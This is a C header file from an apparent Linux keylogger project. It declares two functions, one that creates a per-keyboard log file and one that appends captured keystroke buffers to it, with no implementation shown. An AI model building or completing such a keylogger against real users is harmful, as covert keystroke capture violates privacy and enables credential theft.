/* file_handler.h */
#ifndef LINUX_KEYLOGGER_FILE_HANDLER_H
#define LINUX_KEYLOGGER_FILE_HANDLER_H

#include <stddef.h>

extern void create_log_file(int kb_id);

extern void append_to_file(const char *keystroke_buffer, int kb_id);


#endif
